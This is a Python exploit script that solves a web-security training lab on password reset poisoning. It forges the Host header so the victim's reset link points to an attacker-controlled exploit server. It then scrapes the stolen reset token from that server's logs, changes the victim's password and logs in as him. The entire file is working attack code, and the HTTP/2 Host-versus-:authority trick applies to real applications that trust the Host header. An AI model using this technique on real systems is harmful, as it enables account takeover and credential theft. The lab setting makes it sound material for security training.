##############################################################
#
# Lab: Basic password reset poisoning
#
# Hack Steps: 
#      1. Make forgot-password request as carlos with 
#         the Host header changed to the exploit server
#      2. Wait for carlos to click the poisoned link and
#         extract the token from the server logs
#      3. Change carlos password with the obtained token
#      4. Login as carlos with the new password
#      5. Fetch carlos profile
#
# Note: the request must be sent over HTTP/2. The edge routes the
#       request using the :authority pseudo header (the real lab
#       host), while the app builds the reset link from the Host
#       header, which lets us poison it without losing the route
#       to the lab.
#
##############################################################
import httpx
import re
import time
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a8a00d804b4a93a80058077005700da.web-security-academy.net"

# Change this to your exploit server DOMAIN
EXPLOIT_SERVER_DOMAIN = "exploit-0a3f00cc04f0a9da80767fdc013c008c.exploit-server.net"

NEW_CARLOS_PASSWORD = "Hacked" # You can change this to what you want

client = httpx.Client(http2=True, timeout=30, follow_redirects=False)

def main():
    print("⦗1⦘ Making forgot-password request as carlos with the Host changed.. ", end="", flush=True)
    
    making_forgot_password_request_as_carlos()  

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Waiting for carlos to click the poisoned link and extracting the token from the server logs.. ", end="", flush=True)

    token = wait_for_token_from_logs()
    
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗3⦘ Changing carlos password with the obtained token.. ", end="", flush=True)

    change_carlos_password(token)
        
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 Password was changed to " + Fore.GREEN + NEW_CARLOS_PASSWORD)
    print(Fore.WHITE + "⦗4⦘ Logging in as carlos with the new password.. ", end="", flush=True)

    login_as_carlos()

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗5⦘ Fetching carlos profile.. ", end="", flush=True)

    fetch("/my-account")
    
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def making_forgot_password_request_as_carlos():
    data = { "csrf": get_csrf("/forgot-password"), "username": "carlos" }
    headers = { "Host": EXPLOIT_SERVER_DOMAIN }
    post_data("/forgot-password", data, headers)

    
def fetch_server_logs():
    try:  
        return httpx.get(f"https://{EXPLOIT_SERVER_DOMAIN}/log", timeout=20)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch server logs through exception")
        exit(1)


def wait_for_token_from_logs():
    # The token only appears in the logs after carlos clicks the poisoned
    # link sent to his email, which may take a few seconds
    for _ in range(30):
        log_page = fetch_server_logs()
        token = re.findall("temp-forgot-password-token=([^&\\s\"']+)", log_page.text)
        if len(token) != 0:
            return token[len(token)-1] # last token in the logs
        time.sleep(2)
    print(Fore.RED + "⦗!⦘ No tokens are found in the logs")
    exit(1)

def change_carlos_password(token):
    data = {
        "csrf": get_csrf(f"/forgot-password?temp-forgot-password-token={token}"),
        "temp-forgot-password-token": token,
        "new-password-1": NEW_CARLOS_PASSWORD,
        "new-password-2": NEW_CARLOS_PASSWORD,
    }
    post_data("/forgot-password", data)


def login_as_carlos():
    data = {
        "csrf": get_csrf("/login"),
        "username": "carlos",
        "password": NEW_CARLOS_PASSWORD,
    }
    post_data("/login", data)


def get_csrf(path):
    return re.search('name="csrf" value="([^"]+)"', fetch(path).text).group(1)


def fetch(path):
    try:  
        return client.get(f"{LAB_URL}{path}")
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)


def post_data(path, data, headers = None):
    try:    
        return client.post(f"{LAB_URL}{path}", data=data, headers=headers)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + path + " through exception")
        exit(1)


if __name__ == "__main__":
    main()
